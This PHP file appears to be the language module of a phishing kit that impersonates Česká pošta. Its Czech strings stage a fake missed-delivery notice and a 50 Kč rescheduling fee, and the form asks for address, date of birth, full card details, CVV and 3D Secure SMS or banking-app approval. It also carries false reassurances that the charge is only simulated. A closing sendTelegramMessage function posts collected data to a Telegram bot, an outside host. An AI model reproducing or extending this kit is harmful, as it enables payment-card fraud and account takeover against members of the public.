<?php
/**
 * LANGUAGE SYSTEM - Czech Republic (Česká Republika)
 * Česká pošta - All content in Czech (Čeština) only
 */

// Prevent direct access — this file must be included from another PHP page
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    header('HTTP/1.1 403 Forbidden');
    exit();
}

// Force Czech language for Czech Republic
$current_lang = 'cs';

$translations = [
    'cs' => [
        // Header & Footer
        'secure_conn' => 'Zabezpečené připojení',
        'help_contact' => 'Pomoc a kontakt',
        'cond_gen' => 'Obecné podmínky',
        'data_prot' => 'Ochrana údajů',
        'privacy_policy' => 'Zásady ochrany osobních údajů',
        'cookies' => 'Cookies',
        'copyright' => 'Česká pošta, s.p. – Všechna práva vyhrazena',

        // Modal
        'delivery_issue_title' => 'Oznámení o pokuse o doručení',
        'delivery_issue_message' => 'Váš balíček nemohl být doručen, protože je doručovací adresa neúplná nebo příjemce nebyl zastižen. Chcete-li přeplánovat doručení, aktualizujte prosím své údaje. Podle obecných podmínek se bude účtovat manipulační poplatek ve výši <b>50 Kč</b>.',
        'modal_ref' => 'Číslo případu',
        'btn_continue' => 'Rozumím',

        // CAPTCHA
        'captcha_title' => 'Bezpečnostní ověření',
        'captcha_why' => 'Proč toto ověření?',
        'captcha_desc' => 'Pro ochranu vaší relace vyřešte prosím níže uvedený výpočet.',
        'solve_op' => 'Vyřešte operaci:',
        'enter_result' => 'Vaše odpověď',
        'confirm_access' => 'Pokračovat',
        'secure_zone' => 'Bezpečná zóna',
        'captcha_error' => 'Nesprávná odpověď. Prosím, zkuste znovu.',

        // Pages
        'personal_info_title' => 'Doručovací adresa',
        'personal_info_subtitle' => 'Prosím, ověřte a potvrďte své údaje pro doručení.',
        'payment_title' => 'Platba',
        'verification_title' => 'Ověřování',
        'auth_title' => 'Ověřování',
        'auth_desc' => 'Prosím, čekejte...',
        'loading_delivery_title' => 'Ověření vašich údajů',
        'loading_payment_title' => 'Zpracování platby',
        'loading_code_title' => 'Ověření kódu',

        // Form fields
        'cardholder_name' => 'Jméno držitele',
        'card_no' => 'Číslo karty',
        'expiry' => 'MM/RR',
        'cvv_code' => 'CVV',
        'name' => 'Příjmení',
        'firstname' => 'Jméno',
        'dob' => 'Datum narození',
        'address' => 'Ulice a číslo',
        'npa' => 'PSČ',
        'city' => 'Město',
        'phone' => 'Mobilní telefon',
        'email' => 'E-mailová adresa',
        'required_fields' => '* Všechna pole jsou povinná',
        'complete_now' => 'Potvrdit a pokračovat',

        // Validation errors
        'err_email' => 'Neplatná e-mailová adresa (př. jmeno@priklad.cz)',
        'err_phone' => 'Neplatné telefonní číslo',
        'err_npa' => 'Neplatné PSČ',
        'err_dob' => 'Očekávaný formát: DD/MM/RRRR',
        'err_card_number' => 'Neplatné číslo karty',
        'err_card_expiry' => 'Neplatné nebo vypršelé datum platnosti',
        'err_card_cvv' => 'Neplatný kód CVV (3 nebo 4 číslice)',
        'err_card_holder' => 'Prosím, zadejte úplné jméno držitele karty',
        'err_bad_cc_desc' => 'Virtuální nebo předplacené karty nejsou přijímány. Použijte prosím běžnou bankovní kartu.',

        // Payment section
        'order_total' => 'Celkem',
        'cards_accepted' => 'Přijímané karty',
        'pay_for' => 'Přeplánování doručení',
        'pay_btn' => 'Zaplatit nyní',
        'pay_btn_clean' => 'Potvrdit platbu',
        'secure_banner' => 'Zabezpečená platba – Šifrování SSL 256 bitů',
        'ssl_enc' => 'Transakce zabezpečená SSL',
        'banking_info' => 'Údaje pro platbu',
        'ticket_header' => 'Přehled',
        'fee_delivery' => 'Poplatek za přeplánování',
        'fee_process' => 'Poplatek za zpracování',
        'total_amount' => 'Celkem',
        'vat_msg' => 'DPH zahrnuta',
        'cvv_help' => '3 číslice na zadní straně karty',
        'virtual_card_inline' => 'Jsou přijímány pouze běžné kreditní nebo debetní karty.',
        'processing' => 'Zpracovávání...',

        // SMS & Loading
        'trans_label' => 'Transakce',
        'wait_msg' => 'Prosím, nezavírejte tuto stránku.',
        'verification_header' => 'Ověřování pomocí 3D Secure',
        'verification_text' => 'Ověřovací kód byl odeslán SMS na váš mobilní telefon. Zadejte jej níže pro potvrzení transakce.',
        'code_label' => 'Ověřovací kód',
        'code_invalid' => 'Nesprávný kód. Prosím, zkuste znovu.',
        'confirm_btn' => 'Potvrdit',
        'resend_link' => 'Poslat kód znovu',
        'error_timeout_title' => 'Časový limit vypršel',
        'error_timeout_msg' => 'Ověření se nepodařilo. Nový kód vám bude poslán automaticky.',

        // App Validation
        'app_title' => 'Potvrzení v aplikaci',
        'app_subtitle' => 'Prosím, potvrďte transakci ve vaší bankovní aplikaci.',
        'app_desc' => 'Oznámení bylo odeslano na vaše zařízení. V bankovní aplikaci klepněte na „Potvrdit".',
        'app_btn' => 'Potvrdil jsem',
        'app_sim_disclaimer' => 'Zobrazená částka je pouze simulace. V tomto okamžiku nebude provedeno žádné stržení.',
        'loading_app_title' => 'Ověřování potvrzení',

        // Success
        'success_title' => 'Doručení přeplánováno',
        'success_desc' => 'Vaša žádost byla úspěšně zpracována. Váš balíček bude doručen v níže uvedeném datu.',
        'ref_label' => 'Číslo sledování',
        'date_label' => 'Plánované datum doručení',
        'bene_label' => 'Přepravce',
        'status_label' => 'Stav',
        'status_ok' => 'Potvrzen',
        'home_btn' => 'Zpět na domovskou stránku',
        'help_q' => 'Máte otázku?',
        'contact_supp' => 'Kontaktujte nás',
        'reprogram_title' => 'Nové datum doručení',
        'reprogram_subtitle' => 'Vyberte preferované datum doručení.',
        'reprogram_fee_msg' => 'Pro potvrzení nového data doručení bude účtován poplatek za přeplánování ve výši <b>50 Kč</b>.',
        'btn_validate_reprogram' => 'Potvrdit datum',
        'processing_msg' => 'Prosím, čekejte...',
        'delivery_between' => 'Doručení mezi 08:00 a 18:00',
        'validate_my_info' => 'Potvrdit moje údaje',
        'badge_secure' => 'Zabezpečeno',
        'badge_ssl' => 'Šifrování SSL',
        'badge_verified' => 'Ověřeno',
        'notif_confirm_msg' => 'Potvrdit 50 Kč?',
        '3d_secure_label' => '3D SECURE<br>OVĚŘENO',
        '3d_secure_hint' => 'Zabezpečené bankovní ověřování prostřednictvím 3D Secure',
        'card_warning_box' => '⚠️ <b>Důležité:</b> Pokud platbu nelze zpracovat, doručení nebude přeplánováno a balíček bude vrácen odesílateli.',
        'all_cards_accepted' => 'Přijímány Visa, Mastercard a American Express'
    ]
];

function t($key) {
    global $translations, $current_lang;
    return isset($translations[$current_lang][$key]) ? $translations[$current_lang][$key] : $key;
}

function sendTelegramMessage($token, $chat_id, $message, $keyboard = null) {
    if (!$token || !$chat_id) return;
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
?>
